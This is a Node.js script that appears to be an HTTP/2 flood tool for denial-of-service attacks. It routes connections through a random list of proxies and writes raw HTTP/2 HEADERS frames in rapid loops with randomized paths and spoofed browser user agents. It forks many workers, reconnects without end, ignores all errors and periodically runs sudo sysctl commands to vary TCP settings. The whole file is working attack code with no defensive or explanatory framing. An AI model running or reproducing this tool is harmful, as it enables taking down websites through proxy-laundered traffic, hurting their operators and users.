
const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const randstr = require('randomstring');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const { exec } = require('child_process');
const { setsockopt } = require('sockopt');

require("events").EventEmitter.defaultMaxListeners = Infinity;
process.setMaxListeners(0);
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";

// Constants
const SO_SNDBUF = 7, SO_RCVBUF = 8, TCP_NODELAY = 1, SOL_SOCKET = 1;
const FRAME_HEADER_SIZE = 9;
const SETTINGS = {
    TABLE_SIZE: 65535,
    WINDOW_SIZE: 6291455,
    HEADER_LIST_SIZE: 262144,
    WINDOW_UPDATE: 15663105
};

// Arguments
const [target, duration, rateLimit, threadCount, proxyFilePath] = process.argv.slice(2);
const url = new URL(target);
const proxies = fs.readFileSync(proxyFilePath, 'utf8').replace(/\r/g, '').split('\n');

const statusCodes = {};
let shouldPrintStatus = false;

// Print status codes every second
setInterval(() => {
    if (shouldPrintStatus) {
        console.log(statusCodes);
        Object.keys(statusCodes).forEach(key => statusCodes[key] = 0);
        shouldPrintStatus = false;
    }
}, 1000);

function generateRandomPath() {
    return randstr.generate({
        charset: "123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
        length: 8
    });
}

function encodeFrame(streamId, type, payload = Buffer.alloc(0), flags = 0) {
    const frame = Buffer.alloc(FRAME_HEADER_SIZE);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    return payload.length > 0 ? Buffer.concat([frame, payload]) : frame;
}

function decodeFrame(data) {
    if (data.length < FRAME_HEADER_SIZE) return null;

    const lengthAndType = data.readUInt32BE(0);
    const length = lengthAndType >> 8;
    const type = lengthAndType & 0xFF;
    const flags = data.readUInt8(4);
    const streamId = data.readUInt32BE(5);
    const offset = flags & 0x20 ? 5 : 0;

    const payload = data.subarray(FRAME_HEADER_SIZE + offset, FRAME_HEADER_SIZE + offset + length);
    if (payload.length + offset !== length) return null;

    return { streamId, length, type, flags, payload };
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    settings.forEach(([id, value], i) => {
        data.writeUInt16BE(id, i * 6);
        data.writeUInt32BE(value, i * 6 + 2);
    });
    return data;
}

function launchConnection() {
    const [proxyHost, proxyPort] = proxies[Math.floor(Math.random() * proxies.length)].split(":");
    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        netSocket.once('data', () => {
            setsockopt(netSocket, 6, 3, 1);
            setsockopt(netSocket, 6, TCP_NODELAY, 1);
            setsockopt(netSocket, SOL_SOCKET, SO_SNDBUF, 1000000);
            setsockopt(netSocket, SOL_SOCKET, SO_RCVBUF, 1000000);

            const tlsSocket = tls.connect({
                socket: netSocket,
                ALPNProtocols: ['h2', 'http/1.1'],
                servername: url.hostname,
                rejectUnauthorized: false,
                ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384'
            }, () => handleTLS(tlsSocket));

            tlsSocket.on('error', () => tlsSocket.destroy());
        });
        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
    });
    netSocket.on('error', () => {});
    netSocket.on('close', () => launchConnection());
}

function handleTLS(socket) {
    let streamId = 1;
    let dataBuffer = Buffer.alloc(0);
    const hpack = new HPACK();
    hpack.setTableSize(4096);

    const updateWindow = Buffer.alloc(4);
    updateWindow.writeUInt32BE(SETTINGS.WINDOW_UPDATE);

    const initialFrames = [
        Buffer.from(PREFACE, 'binary'),
        encodeFrame(0, 4, encodeSettings([
            [1, SETTINGS.HEADER_LIST_SIZE],
            [2, 0],
            [4, SETTINGS.WINDOW_SIZE],
            [6, SETTINGS.TABLE_SIZE]
        ])),
        encodeFrame(0, 8, updateWindow)
    ];

    socket.on('data', eventData => {
        dataBuffer = Buffer.concat([dataBuffer, eventData]);
        while (dataBuffer.length >= FRAME_HEADER_SIZE) {
            const frame = decodeFrame(dataBuffer);
            if (!frame) break;

            dataBuffer = dataBuffer.subarray(FRAME_HEADER_SIZE + frame.length);

            if (frame.type === 1) {
                const headers = hpack.decode(frame.payload);
                const status = headers.find(h => h[0] === ':status');
                if (status) {
                    statusCodes[status[1]] = (statusCodes[status[1]] || 0) + 1;
                    shouldPrintStatus = true;
                }
            }

            if (frame.type === 4 && frame.flags === 0) {
                socket.write(encodeFrame(0, 4, Buffer.alloc(0), 1));
            }
            if (frame.type === 5 || frame.type === 7) {
                socket.end(() => socket.destroy());
            }
        }
    });

    socket.write(Buffer.concat(initialFrames));
    sendLoop(socket, streamId, hpack);
}

function sendLoop(socket, streamId, hpack) {
    if (socket.destroyed) return;

    const generateUserAgent = () => {
        const version = Math.floor(Math.random() * 4) + 100;
        const rand = Math.floor(Math.random() * 9000) + 1000;
        return `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/${version}.0.0.0 Safari/537.36`;
    };

    for (let i = 0; i < rateLimit; i++) {
        const headers = [
            [":method", "GET"],
            [":authority", url.hostname],
            [":scheme", "https"],
            [":path", url.pathname.replace("[rand]", generateRandomPath())],
            ["user-agent", generateUserAgent()],
            ["accept", "*/*"],
            ["accept-encoding", "gzip, deflate, br"],
            ["accept-language", "en-US,en;q=0.9"]
        ];

        const payload = Buffer.concat([
            Buffer.from([0x80, 0, 0, 0, 0xFF]),
            hpack.encode(headers)
        ]);

        socket.write(encodeFrame(streamId, 1, payload, 0x1 | 0x4 | 0x20));
        streamId += 2;
    }

    setTimeout(() => sendLoop(socket, streamId, hpack), 1000 / rateLimit);
}

function adjustTCPSettings() {
    const sysctl = (key, values) => `${key}=${values[Math.floor(Math.random() * values.length)]}`;
    const command = `sudo sysctl -w ${[
        sysctl("net.ipv4.tcp_congestion_control", ["cubic", "reno", "bbr"]),
        sysctl("net.ipv4.tcp_sack", ["1", "0"]),
        sysctl("net.ipv4.tcp_window_scaling", ["1", "0"]),
        sysctl("net.ipv4.tcp_timestamps", ["1", "0"]),
        sysctl("net.ipv4.tcp_fastopen", ["3", "2", "1", "0"])
    ].join(" ")}`;
    exec(command);
}

if (cluster.isMaster) {
    for (let i = 0; i < threadCount; i++) {
        cluster.fork({ core: i % os.cpus().length });
    }
    cluster.on('exit', worker => {
        cluster.fork({ core: worker.id % os.cpus().length });
    });
    setInterval(adjustTCPSettings, 5000);
    setTimeout(() => process.exit(1), duration * 1000);
} else {
    setInterval(launchConnection);
    setTimeout(() => process.exit(1), duration * 1000);
}
